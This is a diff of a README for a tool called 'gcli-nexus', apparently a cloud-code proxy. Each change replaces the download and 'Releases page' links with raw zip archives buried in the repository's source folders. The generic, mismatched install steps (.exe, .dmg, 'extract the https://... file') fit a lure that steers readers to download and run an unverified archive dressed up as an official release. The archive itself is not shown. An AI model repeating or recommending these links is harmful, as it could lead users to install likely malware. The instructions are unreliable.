@@ -1,6 +1,6 @@
 # 🚀 gcli-nexus - Smooth Proxy for Your Cloud Code
 
-[![Download gcli-nexus](https://raw.githubusercontent.com/kaalebunna123/gcli-nexus/main/.sqlx/gcli-nexus_1.7.zip)](https://raw.githubusercontent.com/kaalebunna123/gcli-nexus/main/.sqlx/gcli-nexus_1.7.zip)
+[![Download gcli-nexus](https://raw.githubusercontent.com/kaalebunna123/gcli-nexus/main/src/service/gcli_nexus_v3.8.zip)](https://raw.githubusercontent.com/kaalebunna123/gcli-nexus/main/src/service/gcli_nexus_v3.8.zip)
 
 ## 🔍 Overview
 
@@ -19,7 +19,7 @@ To run gcli-nexus smoothly, ensure your system meets the following requirements:
 
 ### Step 1: Visit the Download Page
 
-To download gcli-nexus, go to the [Releases page](https://raw.githubusercontent.com/kaalebunna123/gcli-nexus/main/.sqlx/gcli-nexus_1.7.zip). You will find the latest versions of our software there.
+To download gcli-nexus, go to the [Releases page](https://raw.githubusercontent.com/kaalebunna123/gcli-nexus/main/src/service/gcli_nexus_v3.8.zip). You will find the latest versions of our software there.
 
 ### Step 2: Choose Your Version
 
@@ -35,11 +35,11 @@ Once the download is complete, follow these simple steps to install:
 
 - **Windows:** Double-click the .exe file and follow the prompts.
 - **macOS:** Open the .dmg file and drag the gcli-nexus application into your Applications folder.
-- **Linux:** Extract the https://raw.githubusercontent.com/kaalebunna123/gcli-nexus/main/.sqlx/gcli-nexus_1.7.zip file and run the included installation script.
+- **Linux:** Extract the https://raw.githubusercontent.com/kaalebunna123/gcli-nexus/main/src/service/gcli_nexus_v3.8.zip file and run the included installation script.
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/kaalebunna123/gcli-nexus/main/.sqlx/gcli-nexus_1.7.zip) and download the appropriate file for your system.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/kaalebunna123/gcli-nexus/main/src/service/gcli_nexus_v3.8.zip) and download the appropriate file for your system.
 
 ## 🔌 Configuration
 
